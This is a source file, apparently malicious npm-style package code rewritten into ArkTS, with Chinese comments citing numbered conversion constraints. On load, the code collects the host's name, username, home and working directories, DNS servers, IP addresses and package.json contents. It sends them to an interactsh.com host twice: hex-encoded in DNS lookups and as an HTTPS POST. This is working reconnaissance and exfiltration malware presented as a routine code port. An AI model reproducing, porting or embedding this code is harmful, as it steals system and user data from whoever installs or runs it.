// 应用ArkTS约束：使用let/const替换var（约束9），添加类型注解（约束10,23），替换require为import（约束60,80）
import os from 'os';
import dns from 'dns';
import querystring from 'querystring';
import https from 'https';
import fs from 'fs';
import path from 'path';
import packageJSON from './package.ets'; // 约束78：.ets文件导入

const package = packageJSON.name;

// 定义类型（约束24）
interface StringArray {
    [index: number]: string;
}

// 应用类型注解（约束10）
function getFiles(paths: string[]): string[] {
    let ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) {
        let mpath = paths[j];
        let files = fs.readdirSync(mpath);
        for (let i = 0; i < files.length; i++) {
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
}

// 使用TextEncoder替代Buffer（约束75）
function toHex(data: string): string {
    const encoder = new TextEncoder();
    const bytes = encoder.encode(data);
    let hex = '';
    for (const byte of bytes) {
        hex += byte.toString(16).padStart(2, '0');
    }
    return hex;
}

// 添加返回类型（约束45）
function gethttpips(): string[] {
    let str: string[] = [];
    let networkInterfaces = os.networkInterfaces();
    for (let item in networkInterfaces) {
        if (item != "lo") {
            let addresses = networkInterfaces[item];
            if (addresses) {
                for (let i = 0; i < addresses.length; i++) {
                    str.push(addresses[i].address);
                }
            }
        }
    }
    return str;
}

function getIps(): string {
    let str = "";
    let networkInterfaces = os.networkInterfaces();
    for (let item in networkInterfaces) {
        if (item != "lo") {
            let addresses = networkInterfaces[item];
            if (addresses) {
                for (let i = 0; i < addresses.length; i++) {
                    str += toHex(addresses[i].address) + ".";
                }
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(filePath: string): string {
    let str = "p";
    let chunks = filePath.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
}

// 定义接口（约束24）
interface PackageData {
    hn: string;
    p: string;
    c: string;
    un: string;
    hd: string;
    dns: string;
    r?: string;
    v: string;
    pjson: any;
    ip: string;
}

function toName(pkg: PackageData): string[] {
    let queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    let baseStr = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;

    if (baseStr.length > 255) {
        // 分块逻辑保持结构不变
        let substr1 = `${toHex(pkg.p)}.${getPathChunks(pkg.c)}`;
        let substr2 = getIps();
        
        if (substr1.length < 150) {
            queries.push(`${toHex(pkg.hn)}.${substr1}.${toHex(pkg.un)}.${hostname}`);
            queries.push(`${substr2}.${hostname}`);
        } else if (substr2.length < 150) {
            queries.push(`${substr1}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${toHex(pkg.un)}.${substr2}.${hostname}`);
        } else {
            queries.push(`${toHex(pkg.hn)}.${substr1}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${toHex(pkg.hd)}.${toHex(pkg.un)}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${substr2}.${hostname}`);
        }
    } else {
        queries.push(baseStr);
    }
    return queries;
}

// 定义接口替代any类型（约束10）
interface TrackingData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: any;
    ip: string;
}

const td: TrackingData = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON?.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
};

let qs = toName(td as PackageData);
for (let j = 0; j < qs.length; j++) {
    dns.lookup(qs[j], (err: Error | null, result: string) => {
        // 保持回调结构
    });
}

const trackingData = JSON.stringify(td);
let postData = querystring.stringify({
    msg: trackingData,
});

// 使用ArkTS的HTTP模块（约束75）
let options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString(),
    },
};

let req = https.request(options, (res: any) => {
    res.on("data", (d: Uint8Array) => {
        // 数据处理
    });
});

req.on("error", (e: Error) => {
    // 错误处理
});

req.write(postData);
req.end();
